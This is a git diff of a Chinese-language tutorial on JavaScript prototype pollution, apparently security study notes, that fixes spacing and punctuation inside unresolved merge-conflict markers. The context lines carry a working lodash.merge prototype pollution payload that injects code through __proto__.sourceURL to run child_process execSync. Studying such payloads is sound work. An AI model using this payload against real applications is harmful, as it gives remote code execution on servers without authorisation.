@@ -111,7 +111,7 @@ console.log(o3.b)
 ```plain
 let o1 = {}//创建一个空对象
 let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
-//创建一个对象，对象存在两个属性一个是a,值为1，另一个属性是一个原型对象，值为{b: 2}
+//创建一个对象，对象存在两个属性一个是 a，值为 1，另一个属性是一个原型对象，值为{b: 2}
 =======
 ```bash
 let o1 = {}//创建一个空对象
@@ -455,7 +455,7 @@ app.listen(3000, () => console.log(`Example app listening on port 3000!`))
 还是先找造成漏洞产生的函数 =>lodash.merge
 
 <<<<<<< HEAD
-这里很简单：用 `lodash.merge` 方法将用户提交的信息合并到 session 里面去，多次提交， session 里最终保存用户提交的所有信息。
+这里很简单：用 `lodash.merge` 方法将用户提交的信息合并到 session 里面去，多次提交，session 里最终保存用户提交的所有信息。
 =======
 这里很简单：用 `lodash.merge` 方法将用户提交的信息合并到 session 里面去，多次提交，session 里最终保存用户提交的所有信息。
 >>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
@@ -467,7 +467,7 @@ Payload：
 <<<<<<< HEAD
 ```plain
 {"__proto__":{"sourceURL":"\u000areturn e =>{return global.process.mainModule.constructor._load('child_process').execSync('id')}"}}
-#\u000a Unicode编码表示换行
+#\u000a Unicode 编码表示换行
 =======
 ```bash
 {"__proto__":{"sourceURL":"\u000areturn e =>{return global.process.mainModule.constructor._load('child_process').execSync('id')}"}}
